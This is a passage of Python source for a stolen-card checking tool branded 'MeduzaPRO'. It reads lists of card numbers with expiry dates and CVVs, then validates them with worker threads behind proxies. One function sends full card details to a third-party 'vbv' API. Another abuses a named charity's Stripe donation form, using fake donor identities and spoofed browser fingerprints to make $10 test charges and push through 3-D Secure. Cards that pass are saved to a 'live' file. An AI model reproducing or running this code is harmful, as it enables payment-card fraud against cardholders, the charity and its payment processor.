    ses = requests.Session()

    fake = Faker("en_UK")

    chars = string.ascii_letters + string.digits + string.punctuation

    password = "".join(secrets.choice(chars) for _ in range(12))

    ua = UserAgent(platforms="desktop")

    useragents = ua.random

    fingerprintId = (
        __import__("hashlib").sha256(f"{useragents}|{proxy or ''}".encode()).hexdigest()
    )

    firstname = fake.first_name()

    lastname = fake.last_name()

    email = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}@{random.choice(['gmail.com','yahoo.com','outlook.com','hotmail.com','icloud.com','proton.me','protonmail.com','live.com','msn.com','yahoo.co.id','yahoo.co.uk','yahoo.co.jp','ymail.com','rocketmail.com','live.uk','live.co.uk','live.ca','outlook.co.uk','outlook.jp','tutanota.com','tutanota.de','mailbox.org','zoho.com','zohomail.com','fastmail.com','pm.me','yandex.com','yandex.ru','mail.ru','gmx.com','gmx.de','web.de','seznam.cz','laposte.net','orange.fr','edumail.vn','student.mail','alumni.email','icousd.com','ymail.cc','byom.de','momoi.re','mailgun.co','inboxkitten.com','maildrop.cc', 'web.de', 'byom.my.id'])}"

    today = datetime.now().strftime("%Y-%m-%d")

    today1 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if GLOBAL_PROXY:

        ses.proxies.update(GLOBAL_PROXY)

    for attempt in range(5):

        try:

            cc, mm, yy, cvv = card.split("|")

            headers = {
                "Accept": "*/*",
                "User-Agent": useragents,
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
            }

            url = f"https://api.voidapi.xyz/v2/vbv??key=VDX-SHA2X-NZ0RS-O7HAM&card={cc}|{mm}|{yy}|{cvv}"

            r = ses.get(url, headers=headers)

            text = r.text.strip()

            live = [
                "authenticate_successful",
                "authenticate_attempt_successful",
                "authentication_successful",
                "authentication_attempt_successful",
                "three_d_secure_passed",
                "three_d_secure_authenticated",
                "three_d_secure_attempted",
                "liability_shifted",
                "liability_shift_possible",
                "frictionless_flow",
                "challenge_not_required",
            ]

            status = gstr(text, 'status":"', '"') or "Card type not support."

            if "524: A timeout occurred" in text:

                if attempt < 4:

                    safe_print(
                        f"  {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                        f"{MAGENTA}RETRY {WHITE}--> {MAGENTA}Card processing error. Try again later.{RESET}"
                    )

                    time.sleep(7)

                    continue

                safe_print(
                    f"    {LRED}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{LRED}MAXRETRY {WHITE}--> {LRED}Maximum retry limit reached.{RESET}"
                )

                return None

            # LIVE

            if status in live:

                safe_print(
                    f"    {GREEN}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{GREEN}LIVE {WHITE}--> {GREEN}{status}{RESET}"
                )

                return True

            # DECLINED

            safe_print(
                f"    {LRED}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{LRED}DECLINED {WHITE}--> {LRED}{status}{RESET}"
            )

            return False

        except ProxyError:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Proxy unavailable. Replace the proxy or try again.{RESET}"
            )

            return None

        except SSLError:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}SSL handshake failed. Check HTTPS or proxy settings.{RESET}"
            )

            return None

        except (ConnectionError, Timeout, socket.timeout):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Network timeout. Connection may be unstable.{RESET}"
            )

            return None

        except HTTPError as e:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}HTTP {e.response.status_code}. Request rejected.{RESET}"
            )

            return None

        except TooManyRedirects:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Redirect loop detected.{RESET}"
            )

            return None

        except (ChunkedEncodingError, ContentDecodingError):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Corrupted server response received.{RESET}"
            )

            return None

        except (InvalidURL, InvalidSchema):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Invalid request URL.{RESET}"
            )

            return None

        except RequestException as e:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Request failed: {e}{RESET}"
            )

            return None


def chrgeccn(card: str, proxy: Optional[str] = None) -> Optional[bool]:

    ses = requests.Session()

    fake = Faker("en_US")

    chars = string.ascii_letters + string.digits + string.punctuation

    password = "".join(secrets.choice(chars) for _ in range(12))

    ua = UserAgent(platforms="mobile")

    useragents = ua.random

    fingerprintId = (
        __import__("hashlib").sha256(f"{useragents}|{proxy or ''}".encode()).hexdigest()
    )

    firstname = fake.first_name()

    lastname = fake.last_name()

    fullname = f"{firstname} {lastname}"

    email = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}@{random.choice(['gmail.com','yahoo.com','outlook.com','hotmail.com','icloud.com','proton.me','protonmail.com','live.com','msn.com','yahoo.co.id','yahoo.co.uk','yahoo.co.jp','ymail.com','rocketmail.com','live.uk','live.co.uk','live.ca','outlook.co.uk','outlook.jp','tutanota.com','tutanota.de','mailbox.org','zoho.com','zohomail.com','fastmail.com','pm.me','yandex.com','yandex.ru','mail.ru','gmx.com','gmx.de','web.de','seznam.cz','laposte.net','orange.fr','edumail.vn','student.mail','alumni.email','icousd.com','ymail.cc','byom.de','momoi.re','mailgun.co','inboxkitten.com','maildrop.cc', 'web.de', 'byom.my.id'])}"

    today = datetime.now().strftime("%Y-%m-%d")

    timeunix = int(time.time() * 1000)

    today1 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if GLOBAL_PROXY:

        ses.proxies.update(GLOBAL_PROXY)

    for attempt in range(5):

        try:

            cc, mm, yy, cvv = card.split("|")

            mm = mm.zfill(2)

            yy = yy[-2:].zfill(2)

            cvv = cvv[:4]

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.google.com/",
                "user-agent": useragents,
            }

            r = ses.get("https://panhuman.us/donate-now/", headers=headers)

            txt = r.text

            formId = gstr(
                txt,
                "root-data-givewp-embed' data-form-url='https://panhuman.us/?post_type=give_forms&#038;p=",
                "'",
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://panhuman.us/donate-now/",
                "sec-fetch-dest": "iframe",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "upgrade-insecure-requests": "1",
                "user-agent": useragents,
            }

            params = {
                "givewp-route": "donation-form-view",
                "form-id": formId,
            }

            r = ses.get("https://panhuman.us/", params=params, headers=headers)

            txt = r.text

            stripeConnectedAccountId = gstr(txt, 'stripeConnectedAccountId":"', '"')

            stripeKey = gstr(txt, 'stripeKey":"', '"')

            signatureToken = gstr(
                txt,
                'donateUrl":"https:\\/\\/panhuman.us?givewp-route=donate&givewp-route-signature=',
                "&givewp",
            )

            m = re.search(r'"donateUrl":"([^"]+)"', txt)

            if not m:

                raise ValueError

            donate_url = m.group(1).replace("\\/", "/")

            qs = parse_qs(urlparse(donate_url).query)

            signature = qs.get("givewp-route-signature", [""])[0]

            expiration = qs.get("givewp-route-signature-expiration", [""])[0]

            headers = {
                "accept": "application/json",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": useragents,
            }

            r = ses.get(
                f"https://api.stripe.com/v1/elements/sessions?deferred_intent[mode]=payment&deferred_intent[amount]=1000&deferred_intent[currency]=usd&key=pk_live_51Q4VBQGh2ik4BgJRUs0Tsa7kTJYLDWqRBcEAsVdr5bFD35LZgJo1lUm69aQy3EAP0Q4RUHjS5hMOPJdjXEMe2e1c00YqzB5i2V&_stripe_account=acct_1Q4VBQGh2ik4BgJR&elements_init_source=stripe.elements&referrer_host=panhuman.us&session_id=elements_session_1OvhQbHZK09&stripe_js_id={str(uuid.uuid4())}&top_level_referrer_host=panhuman.us&locale=id-ID&type=deferred_intent",
                headers=headers,
            )

            headers = {
                "accept": "application/json",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "no-cache",
                "origin": "https://panhuman.us",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": f"https://panhuman.us/?givewp-route=donation-form-view&form-id={formId}",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragents,
            }

            params = {
                "givewp-route": "donate",
                "givewp-route-signature": signature,
                "givewp-route-signature-id": "givewp-donate",
                "givewp-route-signature-expiration": expiration,
            }

            payload = {
                "amount": (None, "10"),
                "currency": (None, "USD"),
                "donationType": (None, "single"),
                "subscriptionPeriod": (None, "one-time"),
                "subscriptionFrequency": (None, "1"),
                "subscriptionInstallments": (None, "0"),
                "formId": (None, formId),
                "gatewayId": (None, "stripe_payment_element"),
                "feeRecovery": (None, "0"),
                "firstName": (None, "Belinda"),
                "lastName": (None, "Holland"),
                "email": (None, email),
                "phone": (None, "+16367513276"),
                "country": (None, "US"),
                "address1": (None, "1119 Irving Place"),
                "address2": (None, ""),
                "city": (None, "Manchester"),
                "state": (None, "MO"),
                "zip": (None, "63011"),
                "anonymous": (None, "true"),
                "comment": (None, "hay kontol"),
                "donationBirthday": (None, ""),
                "originUrl": (None, "https://panhuman.us/donate-now/"),
                "isEmbed": (None, "true"),
                "embedId": (None, "give-form-shortcode-1"),
                "gatewayData[stripePaymentMethod]": (None, "card"),
                "gatewayData[stripePaymentMethodIsCreditCard]": (None, "true"),
                "gatewayData[formId]": (None, formId),
                "gatewayData[stripeKey]": (
                    None,
                    "pk_live_51Q4VBQGh2ik4BgJRUs0Tsa7kTJYLDWqRBcEAsVdr5bFD35LZgJo1lUm69aQy3EAP0Q4RUHjS5hMOPJdjXEMe2e1c00YqzB5i2V",
                ),
                "gatewayData[stripeConnectedAccountId]": (
                    None,
                    "acct_1Q4VBQGh2ik4BgJR",
                ),
            }

            r = ses.post(
                "https://panhuman.us/", params=params, headers=headers, files=payload
            )

            txt = r.text

            clientSecret = gstr(txt, 'clientSecret":"', '"')

            pi_only = gstr(txt, 'clientSecret":"', "_secret_")

            headers = {
                "accept": "application/json",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": useragents,
            }

            data = {
                "return_url": "https://panhuman.us/donate-now/?givewp-event=donation-completed&givewp-listener=show-donation-confirmation-receipt&givewp-receipt-id=631a78f393230c4cfb9f410550530b2b&givewp-embed-id=give-form-shortcode-1",
                "payment_method_data[billing_details][name]": fullname,
                "payment_method_data[billing_details][email]": email,
                "payment_method_data[billing_details][address][city]": "Manchester",
                "payment_method_data[billing_details][address][country]": "US",
                "payment_method_data[billing_details][address][line1]": "1119 Irving Place",
                "payment_method_data[billing_details][address][line2]": "",
                "payment_method_data[billing_details][address][postal_code]": "63011",
                "payment_method_data[billing_details][address][state]": "MO",
                "payment_method_data[type]": "card",
                "payment_method_data[card][number]": cc,
                "payment_method_data[card][cvc]": cvv,
                "payment_method_data[card][exp_year]": yy,
                "payment_method_data[card][exp_month]": mm,
                "payment_method_data[allow_redisplay]": "unspecified",
                "payment_method_data[pasted_fields]": "number",
                "payment_method_data[payment_user_agent]": "stripe.js/8045757330; stripe-js-v3/8045757330; payment-element; deferred-intent; autopm",
                "payment_method_data[referrer]": "https://panhuman.us",
                "payment_method_data[time_on_page]": "159494",
                "payment_method_data[client_attribution_metadata][client_session_id]": "3f56d208-097e-492f-ab71-c2098a49749b",
                "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
                "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
                "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
                "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
                "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
                "payment_method_data[client_attribution_metadata][elements_session_config_id]": "72fb180d-926d-4180-92c2-74cf43adbfd1",
                "payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]": "payment",
                "payment_method_data[guid]": "N/A",
                "payment_method_data[muid]": "N/A",
                "payment_method_data[sid]": "N/A",
                "expected_payment_method_type": "card",
                "client_context[currency]": "usd",
                "client_context[mode]": "payment",
                "use_stripe_sdk": "true",
                "key": "pk_live_51Q4VBQGh2ik4BgJRUs0Tsa7kTJYLDWqRBcEAsVdr5bFD35LZgJo1lUm69aQy3EAP0Q4RUHjS5hMOPJdjXEMe2e1c00YqzB5i2V",
                "_stripe_account": "acct_1Q4VBQGh2ik4BgJR",
                "client_attribution_metadata[client_session_id]": "3f56d208-097e-492f-ab71-c2098a49749b",
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "automatic",
                "client_attribution_metadata[elements_session_config_id]": "72fb180d-926d-4180-92c2-74cf43adbfd1",
                "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
                "client_secret": clientSecret,
            }

            r = ses.post(
                f"https://api.stripe.com/v1/payment_intents/{pi_only}/confirm",
                headers=headers,
                data=data,
            )

            response_text = r.text

            try:

                resp = json.loads(response_text)

            except:

                resp = {}

            err = resp.get("error") or {}

            last = (err.get("payment_intent") or {}).get("last_payment_error") or {}

            status = gstr(response_text, '"status": "', '"')

            decline_code = (
                last.get("decline_code")
                or last.get("code")
                or err.get("decline_code")
                or err.get("code")
            )

            message = last.get("message") or err.get("message")

            if decline_code:

                safe_print(
                    f"    {RED}⭢ {LWHITE}{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}{decline_code.upper()}{LWHITE}: {Fore.RED}{message}{Style.RESET_ALL}"
                )

                return False

            if status == "succeeded":

                safe_print(
                    f"    {LGREEN}⭢ {LWHITE}{cc}|{mm}|{yy}|{cvv} --> {LGREEN}CHARGE{LWHITE}: {LGREEN}Charge Successfully.{Style.RESET_ALL}"
                )

                return True

            if status == "requires_action":

                three_d_secure_2_source = (
                    resp.get("next_action", {})
                    .get("use_stripe_sdk", {})
                    .get("three_d_secure_2_source")
                )

                headers = {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "cache-control": "no-cache",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://geoissuer.cardinalcommerce.com",
                    "pragma": "no-cache",
                    "priority": "u=0, i",
                    "referer": "https://geoissuer.cardinalcommerce.com/",
                    "user-agent": useragents,
                }

                data = {
                    "threeDSMethodData": "eyJ0aHJlZURTU2VydmVyVHJhbnNJRCI6ImMxMmU5NmRhLWY0OWUtNDc1Yi05NzMyLTZkYWNjOTJkZTdhMCJ9",
                }

                r = ses.post(
                    f"https://hooks.stripe.com/3d_secure_2/fingerprint/{stripeConnectedAccountId}/{three_d_secure_2_source}",
                    headers=headers,
                    data=data,
                )

                headers = {
                    "accept": "application/json",
                    "cache-control": "no-cache",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://js.stripe.com/",
                    "user-agent": useragents,
                }

                browser_data = {
                    "fingerprintAttempted": True,
                    "challengeWindowSize": None,
                    "threeDSCompInd": "Y",
                    "browserJavaEnabled": False,
                    "browserJavascriptEnabled": True,
                    "browserLanguage": "en-GB",
                    "browserColorDepth": "24",
                    "browserScreenHeight": "1080",
                    "browserScreenWidth": "1920",
                    "browserTZ": "0",
                    "browserUserAgent": useragents,
                }

                browser_json = json.dumps(browser_data)

                browser_encoded = quote_plus(browser_json)

                data = (
                    f"source={three_d_secure_2_source}&"
                    f"browser={browser_encoded}&"
                    f"one_click_authn_device_support[hosted]=false&"
                    f"one_click_authn_device_support[same_origin_frame]=false&"
                    f"one_click_authn_device_support[spc_eligible]=false&"
                    f"one_click_authn_device_support[webauthn_eligible]=false&"
                    f"one_click_authn_device_support[publickey_credentials_get_allowed]=true&"
                    f"key=pk_live_51Q4VBQGh2ik4BgJRUs0Tsa7kTJYLDWqRBcEAsVdr5bFD35LZgJo1lUm69aQy3EAP0Q4RUHjS5hMOPJdjXEMe2e1c00YqzB5i2V&"
                    f"_stripe_version=2024-06-20"
                )

                r = ses.post(
                    "https://api.stripe.com/v1/3ds2/authenticate",
                    headers=headers,
                    data=data,
                )

                headers = {
                    "accept": "application/json",
                    "cache-control": "no-cache",
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://js.stripe.com",
                    "pragma": "no-cache",
                    "priority": "u=1, i",
                    "referer": "https://js.stripe.com/",
                    "user-agent": useragents,
                }

                params = {
                    "is_stripe_sdk": "false",
                    "client_secret": clientSecret,
                    "key": "pk_live_51Q4VBQGh2ik4BgJRUs0Tsa7kTJYLDWqRBcEAsVdr5bFD35LZgJo1lUm69aQy3EAP0Q4RUHjS5hMOPJdjXEMe2e1c00YqzB5i2V",
                    "_stripe_version": "2024-06-20",
                }

                r = ses.get(
                    f"https://api.stripe.com/v1/payment_intents/{pi_only}",
                    params=params,
                    headers=headers,
                )

                response_text = r.text

                try:

                    resp = json.loads(response_text)

                except:

                    resp = {}

                err = resp.get("error") or {}

                last = (err.get("payment_intent") or {}).get("last_payment_error") or {}

                status = gstr(response_text, '"status": "', '"')

                decline_code = (
                    last.get("decline_code")
                    or last.get("code")
                    or err.get("decline_code")
                    or err.get("code")
                )

                message = last.get("message") or err.get("message")

                if decline_code:

                    safe_print(
                        f"    {RED}⭢ {LWHITE}{cc}|{mm}|{yy}|{cvv} --> {Fore.RED}{decline_code.upper()}{LWHITE}: {Fore.RED}{message}{Style.RESET_ALL}"
                    )

                    return False

                if status == "succeeded":

                    safe_print(
                        f"    {LGREEN}⭢ {LWHITE}{cc}|{mm}|{yy}|{cvv} --> {LGREEN}CHARGE{LWHITE}: {LGREEN}Charge Successfully.{Style.RESET_ALL}"
                    )

                    return True

                if status == "requires_action":

                    safe_print(
                        f"    {LYELLOW}⭢ {LWHITE}{cc}|{mm}|{yy}|{cvv} --> {LYELLOW}CARD_3DS{LWHITE}: {Fore.RED}Card requires three3ds action.{Style.RESET_ALL}"
                    )

                    return False

        except ProxyError:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Proxy unavailable. Replace the proxy or try again.{RESET}"
            )

            return None

        except SSLError:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}SSL handshake failed. Check HTTPS or proxy settings.{RESET}"
            )

            return None

        except (ConnectionError, Timeout, socket.timeout):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Network timeout. Connection may be unstable.{RESET}"
            )

            return None

        except HTTPError as e:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}HTTP {e.response.status_code}. Request rejected.{RESET}"
            )

            return None

        except TooManyRedirects:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Redirect loop detected.{RESET}"
            )

            return None

        except (ChunkedEncodingError, ContentDecodingError):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Corrupted server response received.{RESET}"
            )

            return None

        except (InvalidURL, InvalidSchema):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Invalid request URL.{RESET}"
            )

            return None

        except RequestException as e:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Request failed: {e}{RESET}"
            )

            return None


CHECKERS = {
    "01": ("Stripe auth CCN", flow1, 4),
    "02": ("Stripe auth CVV", flow2, 4),
    "03": ("Braintree non-VBV", nonvbv, 1),
    "04": ("Stripe Checkout $10", chrgeccn, 3),
}


def pretty_error(msg: str):

    print(f"\n     {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} {msg}{Style.RESET_ALL}")


def load_combos(path: str):

    try:

        if not path:

            raise ValueError(
                f"\n     {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} Path is empty."
            )

        p = Path(path).expanduser().resolve()

        if not p.is_file():

            raise FileNotFoundError(
                f"\n     {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} File not found: {p}"
            )

        if p.suffix.lower() != ".txt":

            raise ValueError(
                f"\n     {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} File must be .txt"
            )

        combos = set()

        with p.open("r", encoding="utf-8", errors="strict") as f:

            for line in f:

                line = line.strip()

                if not line:

                    continue

                if " " in line and "|" in line:

                    first, rest = line.split(" ", 1)

                    if not first.replace("+", "").isdigit():

                        line = rest.strip()

                parts = [part.strip() for part in line.split("|")]

                if len(parts) < 4:

                    continue

                cc, mm, yy, c2 = parts[:4]

                combos.add(f"{cc}|{mm}|{yy}|{c2}")

        if not combos:

            raise ValueError(
                f"\n     {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} No valid combos found."
            )

        return list(combos), p

    except UnicodeDecodeError:

        raise ValueError(
            f"\n     {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} File must be UTF-8 encoded."
        )

    except Exception as e:

        raise RuntimeError(
            f"\n     {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} Failed to load combos: {e}"
        )


def worker(combo, flow_func, checker_id, live_path, proxy=None):

    if not isinstance(combo, str):

        return

    try:

        result = flow_func(combo, proxy=proxy)

    except Exception:

        return

    if result is True:

        with lock:

            live_counter[checker_id] += 1

            live_path.parent.mkdir(parents=True, exist_ok=True)

            with live_path.open("a", encoding="utf-8") as f:

                f.write(combo + "\n")

                f.flush()

                os.fsync(f.fileno())


def run_checker(filename, checker_id, combos, flow_func, max_workers, proxy=None):

    live_path = RESULT_DIR / filename

    with ThreadPoolExecutor(max_workers=max_workers) as executor:

        futures = [
            executor.submit(
                worker,
                combo,
                flow_func,
                checker_id,
                live_path,
                proxy,
            )
            for combo in combos
        ]

        for future in as_completed(futures):

            try:

                future.result()

            except Exception:

                continue


def handle_checker(checker_id, title, combos, flow_func, max_workers, proxy=None):

    try:

        os.system("cls" if os.name == "nt" else "clear")

        separator = f"{LWHITE}    {'-' * 66}{RESET}"

        safe_print(banner)

        # print(separator)

        # init counter once

        live_counter.setdefault(checker_id, 0)

        # generate filename once

        filename = f"{re.sub(r'[^a-z0-9]+', '', title.lower())}_live.txt"

        result_path = RESULT_DIR / filename

        total_cards = len(combos)

        print(
            f"     {BLUE}[▪]{LWHITE} " f"Load card total : {BLUE}{total_cards}{RESET}"
        )

        print(
            f"     {BLUE}[▪]{LWHITE} " f"Live file path  : {BLUE}{result_path}{RESET}"
        )

        print(separator)

        # run checker

        run_checker(
            filename=filename,
            checker_id=checker_id,
            combos=combos,
            flow_func=flow_func,
            max_workers=max_workers,
            proxy=proxy,
        )

        live_found = live_counter.get(checker_id, 0)

        print(
            f"\n  {Fore.LIGHTCYAN_EX}[▪]{Fore.LIGHTGREEN_EX} "
            f"Live found : {live_found}"
        )

        print(
            f"  {Fore.LIGHTCYAN_EX}[▪]{Fore.LIGHTGREEN_EX} " f"Saved to : {result_path}"
        )

        input(f"\n  {Fore.RED}[Press ENTER to return]{Style.RESET_ALL}")

    except Exception as error:

        print(
            f"\n  {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} "
            f"Checker failed: {Fore.RED}{error}{Style.RESET_ALL}"
        )

        input(f"\n  {Fore.RED}[Press ENTER to return]{Style.RESET_ALL}")


def main() -> None:

    set_title("MeduzaPRO")

    while True:

        try:

            os.system("cls" if os.name == "nt" else "clear")

            safe_print(banner1)


            print(f"{LWHITE}    {'-' * 66}{RESET}")

            print(f"     {Fore.LIGHTWHITE_EX}[01]{Fore.LIGHTCYAN_EX} Stripe Auth CCN")

            print(f"     {Fore.LIGHTWHITE_EX}[02]{Fore.LIGHTCYAN_EX} Stripe Auth CVV")

            print(f"     {Fore.LIGHTWHITE_EX}[03]{Fore.LIGHTCYAN_EX} Braintree Non-VBV")

            print(
                f"     {Fore.LIGHTWHITE_EX}[04]{Fore.LIGHTCYAN_EX} Stripe Checkout $10"
            )

            print(f"     {Fore.LIGHTWHITE_EX}[05]{Fore.LIGHTRED_EX} Configure Proxy")

            print(f"     {Fore.LIGHTRED_EX}[00]{Fore.LIGHTWHITE_EX} Exit")

            print(f"    {LWHITE}{'-' * 66}{RESET}")

            choice = input(
                f"     {Fore.LIGHTCYAN_EX}[▪]{Fore.LIGHTWHITE_EX} Select option > "
            ).strip()

            print(f"    {LWHITE}{'-' * 66}{RESET}")

            if not choice or not choice.isdigit():

                print(f"    {LWHITE}{'-' * 66}{RESET}")

                print(
                    f"     {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} "
                    f"Invalid input. Please select using the menu numbers."
                )

                time.sleep(2)

                continue

            choice = choice.zfill(2)

            if choice == "00":

                sys.exit(0)

            if choice == "05":

                set_global_proxy()

                input(f"\n  {Fore.LIGHTBLACK_EX}[Press ENTER to continue]")

                continue

            if choice not in CHECKERS:

                print(
                    f"\n  {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} "
                    f"Selected option is not available."
                )

                time.sleep(2)

                continue

            path = (
                input(
                    f"     {Fore.LIGHTCYAN_EX}[▪]{Fore.LIGHTWHITE_EX} "
                    f"Enter path to cardlist.txt > "
                )
                .strip()
                .strip('"')
                .strip("'")
            )

            try:

                combos, _ = load_combos(path)

            except Exception as error:

                pretty_error(str(error))

                time.sleep(2)

                continue

            title, flow_func, workers = CHECKERS[choice]

            handle_checker(
                checker_id=choice,
                title=title,
                combos=combos,
                flow_func=flow_func,
                max_workers=workers,
            )

        except KeyboardInterrupt:

            sys.exit(0)

        except Exception as error:

            print(f"    {'-' * 68}")

            print(
                f"     {Fore.LIGHTRED_EX}[!]{Fore.LIGHTWHITE_EX} "
                f"Unexpected error: {Fore.RED}{error}{Style.RESET_ALL}"
            )

            print(f"    {'-' * 68}")

            input(f"\n  {Fore.LIGHTBLACK_EX}[Press ENTER to continue]")


if __name__ == "__main__":

    try:

        main()

    except Exception:

        traceback.print_exc()

        safe_exit(1)
